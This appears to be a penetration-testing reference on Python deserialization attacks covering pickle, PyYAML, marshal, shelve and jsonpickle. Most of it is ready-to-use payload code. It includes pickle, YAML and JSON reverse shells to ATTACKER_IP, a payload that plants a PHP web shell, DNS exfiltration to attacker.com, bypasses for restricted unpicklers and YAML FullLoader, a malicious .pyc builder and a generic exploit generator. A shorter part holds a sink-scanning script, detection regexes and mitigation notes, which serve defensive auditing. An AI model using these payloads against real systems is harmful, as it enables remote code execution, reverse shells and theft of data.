# Python Deserialization Attack Reference

## Overview

Python provides several serialization mechanisms — `pickle`, `PyYAML`, `marshal`, `shelve`,
and `jsonpickle` — all of which can lead to arbitrary code execution when processing
untrusted data. Unlike Java/.NET, Python deserialization exploits do not require pre-built
gadget chains; the attacker crafts payloads directly using language-level primitives.

---

## 1. pickle / cPickle

### 1.1 Detection Patterns

**Direct deserialization sinks:**
```python
import pickle
import cPickle           # Python 2
import _pickle           # CPython internal

pickle.loads(data)
pickle.load(file_obj)
cPickle.loads(data)
pickle.Unpickler(file_obj).load()
```

**Indirect / framework sinks:**
```python
# Django sessions with PickleSerializer
SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'

# Flask session cookie (itsdangerous + pickle)
from flask import session

# Celery task serialization
CELERY_TASK_SERIALIZER = 'pickle'
CELERY_ACCEPT_CONTENT = ['pickle']

# Redis / memcached with pickle
import redis
r = redis.Redis()
r.set('key', pickle.dumps(obj))      # store
pickle.loads(r.get('key'))            # sink

# numpy.load (allows_pickle=True by default in old versions)
import numpy
numpy.load('data.npy', allow_pickle=True)

# pandas.read_pickle
import pandas
pandas.read_pickle('data.pkl')

# torch.load (uses pickle internally)
import torch
torch.load('model.pt')
```

### 1.2 Basic __reduce__ Payload

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
```

### 1.3 Reverse Shell Payload

```python
import pickle
import base64

class RevShell:
    def __reduce__(self):
        import os
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = pickle.dumps(RevShell(), protocol=2)
print(base64.b64encode(payload).decode())
```

### 1.4 File Write Payload

```python
import pickle
import base64

class FileWrite:
    def __reduce__(self):
        content = "<?php system($_GET['cmd']); ?>"
        return (eval, ("open('/var/www/html/shell.php','w').write('" + content + "')",))

payload = pickle.dumps(FileWrite())
print(base64.b64encode(payload).decode())
```

### 1.5 DNS Exfiltration Payload

```python
import pickle
import base64

class DNSExfil:
    def __reduce__(self):
        import os
        return (os.system, ('nslookup $(whoami).attacker.com',))

payload = pickle.dumps(DNSExfil())
print(base64.b64encode(payload).decode())
```

### 1.6 Multi-command Payload (chained __reduce__)

```python
import pickle
import base64

class MultiExec:
    def __reduce__(self):
        return (exec, (
            "import os; "
            "os.system('id > /tmp/proof.txt'); "
            "os.system('cat /etc/passwd | head -5 >> /tmp/proof.txt')",
        ))

payload = pickle.dumps(MultiExec())
print(base64.b64encode(payload).decode())
```

### 1.7 Pickle Protocol Variants

```python
import pickle

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('id',))

for proto in range(5):
    p = pickle.dumps(RCE(), protocol=proto)
    print(f"Protocol {proto}: {len(p)} bytes, prefix={p[:2]}")
```

Protocol detection by magic bytes:
```
Protocol 0: human-readable (cos\nsystem\n...)
Protocol 1: ]q\x00
Protocol 2: \x80\x02
Protocol 3: \x80\x03
Protocol 4: \x80\x04
Protocol 5: \x80\x05
```

### 1.8 Raw Opcode Payload (bypass class-based filters)

```python
import base64

raw_pickle = b"""cos
system
(S'id'
tR."""

print(base64.b64encode(raw_pickle).decode())
```

Breakdown:
```
c    - GLOBAL opcode: import module.attr
os   - module name
system - attribute name
(    - MARK
S'id' - push string 'id'
t    - build tuple from MARK
R    - REDUCE: call callable with args tuple
.    - STOP
```

### 1.9 Restricted Unpickler Bypass Attempts

If `RestrictedUnpickler` is used, try:
```python
# If builtins are allowed
raw = b"""cbuiltins
eval
(S'__import__("os").system("id")'
tR."""

# If only certain modules allowed, chain through them
raw = b"""cbuiltins
getattr
(cbuiltins
__import__
(S'os'
tRS'system'
tR(S'id'
tR."""
```

---

## 2. PyYAML

### 2.1 Detection Patterns

```python
import yaml

yaml.load(data)                              # VULNERABLE (no Loader)
yaml.load(data, Loader=yaml.Loader)          # VULNERABLE (same as FullLoader < 5.1)
yaml.load(data, Loader=yaml.UnsafeLoader)    # VULNERABLE (explicitly unsafe)
yaml.load(data, Loader=yaml.FullLoader)      # VULNERABLE (< 5.1, restricted after)
yaml.unsafe_load(data)                       # VULNERABLE (alias)
yaml.full_load(data)                         # Restricted but may have bypasses

yaml.safe_load(data)                         # SAFE
yaml.load(data, Loader=yaml.SafeLoader)      # SAFE
```

### 2.2 Command Execution Payloads

**!!python/object/apply (PyYAML < 6.0):**
```yaml
!!python/object/apply:os.system
args: ['id']
```

**!!python/object/apply with subprocess:**
```yaml
!!python/object/apply:subprocess.check_output
args:
  - ['whoami']
```

**!!python/object/new:**
```yaml
!!python/object/new:os.system
args: ['id > /tmp/proof.txt']
```

**!!python/object:**
```yaml
!!python/object:subprocess.Popen
- ['cat', '/etc/passwd']
```

**Reverse shell via PyYAML:**
```yaml
!!python/object/apply:os.system
args:
  - "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
```

**Module import + exec:**
```yaml
!!python/object/apply:builtins.eval
args:
  - "__import__('os').system('id')"
```

### 2.3 FullLoader Bypasses (PyYAML 5.1 – 5.3.1)

```yaml
!!python/object/apply:subprocess.Popen
- - id
```

```yaml
!!python/object/new:str
  state:
    !!python/tuple
      - "__import__('os').system('id')"
      - !!python/object/apply:builtins.eval []
```

### 2.4 Detection Regex for Code Scanning

```regex
yaml\.load\s*\([^)]*\)(?!.*Loader\s*=\s*yaml\.SafeLoader)
yaml\.load\s*\([^)]*Loader\s*=\s*yaml\.(Loader|UnsafeLoader|FullLoader)
yaml\.(unsafe_load|full_load)\s*\(
```

---

## 3. marshal

### 3.1 Detection Patterns

```python
import marshal

marshal.loads(data)
marshal.load(file_obj)

# Indirect via .pyc files
import importlib
importlib.import_module('user_uploaded')     # loads .pyc → marshal internally
exec(compile(...))                           # if fed marshalled code objects
```

### 3.2 Code Execution Payload

```python
import marshal
import base64
import types

code_str = """
import os
os.system('id')
"""

code_obj = compile(code_str, '<exploit>', 'exec')
marshalled = marshal.dumps(code_obj)
print(base64.b64encode(marshalled).decode())
```

Trigger:
```python
import marshal, types
code_obj = marshal.loads(base64.b64decode(payload))
exec(code_obj)
```

### 3.3 Embedding in .pyc

```python
import marshal
import struct
import time

code = compile("import os; os.system('id')", '<x>', 'exec')
marshalled = marshal.dumps(code)

magic = b'\x61\x0d\x0d\x0a'    # Python 3.10 magic
flags = struct.pack('<I', 0)
timestamp = struct.pack('<I', int(time.time()))
size = struct.pack('<I', 0)

pyc = magic + flags + timestamp + size + marshalled

with open('exploit.pyc', 'wb') as f:
    f.write(pyc)
```

---

## 4. shelve

### 4.1 Detection Patterns

```python
import shelve

db = shelve.open('data.db')
value = db['key']               # deserialization sink (uses pickle internally)
db['key'] = obj                 # serialization
db.close()
```

### 4.2 Exploitation

`shelve` uses `pickle` internally, so all pickle payloads apply:

```python
import shelve
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

db = shelve.open('malicious.db')
db['exploit'] = RCE()
db.close()

# Victim opens the db
db = shelve.open('malicious.db')
obj = db['exploit']              # triggers RCE
```

Alternative — inject raw pickle into the underlying dbm:
```python
import dbm
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

db = dbm.open('malicious.db', 'c')
db['exploit'] = pickle.dumps(RCE())
db.close()
```

---

## 5. jsonpickle

### 5.1 Detection Patterns

```python
import jsonpickle

jsonpickle.decode(json_string)              # deserialization sink
jsonpickle.loads(json_string)               # alias
jsonpickle.encode(obj)                      # serialization

# With unpicklable=False it's safe, but default is True
jsonpickle.encode(obj, unpicklable=False)   # safe — no type info
```

### 5.2 Payload Format

```json
{
  "py/reduce": [
    {"py/function": "os.system"},
    {"py/tuple": ["id"]}
  ]
}
```

**Reverse shell:**
```json
{
  "py/reduce": [
    {"py/function": "os.system"},
    {"py/tuple": ["python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"] }
  ]
}
```

**File write:**
```json
{
  "py/reduce": [
    {"py/function": "builtins.eval"},
    {"py/tuple": ["open('/tmp/proof.txt','w').write('pwned')"]}
  ]
}
```

**Nested / chained:**
```json
{
  "py/reduce": [
    {"py/function": "builtins.exec"},
    {"py/tuple": ["import os; os.system('id'); os.system('whoami')"]}
  ]
}
```

### 5.3 Detection Regex

```regex
jsonpickle\.(decode|loads)\s*\(
```

---

## 6. Automated Detection Script

```python
#!/usr/bin/env python3
"""Scan Python source for deserialization sinks."""
import re
import sys
from pathlib import Path

PATTERNS = {
    'pickle.loads':       r'(?:pickle|cPickle|_pickle)\.loads?\s*\(',
    'pickle.Unpickler':   r'pickle\.Unpickler\s*\(',
    'yaml.load (unsafe)': r'yaml\.load\s*\([^)]*\)(?!.*SafeLoader)',
    'yaml.unsafe_load':   r'yaml\.(unsafe_load|full_load)\s*\(',
    'marshal.loads':      r'marshal\.loads?\s*\(',
    'shelve.open':        r'shelve\.open\s*\(',
    'jsonpickle.decode':  r'jsonpickle\.(decode|loads)\s*\(',
    'torch.load':         r'torch\.load\s*\(',
    'numpy.load':         r'numpy\.load\s*\([^)]*allow_pickle\s*=\s*True',
    'pandas.read_pickle': r'pandas\.read_pickle\s*\(',
}

def scan_file(filepath: Path) -> list:
    findings = []
    try:
        content = filepath.read_text(errors='ignore')
        for name, pattern in PATTERNS.items():
            for m in re.finditer(pattern, content):
                lineno = content[:m.start()].count('\n') + 1
                findings.append((filepath, lineno, name, m.group()))
    except Exception:
        pass
    return findings

def main():
    target = Path(sys.argv[1]) if len(sys.argv) > 1 else Path('.')
    files = target.rglob('*.py') if target.is_dir() else [target]
    total = 0
    for f in files:
        for filepath, lineno, sink, match in scan_file(f):
            print(f"[!] {sink} @ {filepath}:{lineno}  →  {match.strip()}")
            total += 1
    print(f"\n[*] Total sinks found: {total}")

if __name__ == '__main__':
    main()
```

---

## 7. Framework-Specific Contexts

### 7.1 Django

```python
# Settings that enable pickle-based sessions
SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'
# If session data comes from cookie (SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'),
# attacker with SECRET_KEY can forge session → RCE
```

### 7.2 Flask

```python
# Default session uses itsdangerous SecureCookie (JSON-based, safe)
# But custom session interfaces may use pickle:
from flask.sessions import SecureCookieSessionInterface
# If SECRET_KEY is leaked → session forgery
# flask-session with type='redis' uses pickle by default
```

### 7.3 Celery

```python
# task_serializer = 'pickle' (or CELERY_TASK_SERIALIZER)
# accept_content = ['pickle']
# If message broker is accessible, inject pickle payloads as task messages
```

---

## 8. Proof of Concept Template

```python
#!/usr/bin/env python3
"""Generic pickle PoC — customize the command and delivery method."""
import pickle
import base64
import sys

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, (CMD,))

CMD = sys.argv[1] if len(sys.argv) > 1 else 'id'
payload = pickle.dumps(Exploit(), protocol=2)

print(f"[*] Command: {CMD}")
print(f"[*] Raw length: {len(payload)} bytes")
print(f"[*] Base64 payload:\n{base64.b64encode(payload).decode()}")
print(f"[*] Hex payload:\n{payload.hex()}")
print(f"\n[*] Trigger: pickle.loads(base64.b64decode('<payload>'))")
```

---

## 9. Mitigation Notes (for report context)

- **Never unpickle untrusted data** — this is the only complete fix.
- `RestrictedUnpickler` subclasses are bypassable in most configurations.
- HMAC-sign serialized blobs and verify before deserializing.
- For YAML, enforce `yaml.safe_load()` / `yaml.SafeLoader` everywhere.
- For ML pipelines, use `safetensors` instead of `torch.load` / `pickle`.
- Audit `requirements.txt` for libraries that transitively use pickle (redis, celery, etc.).
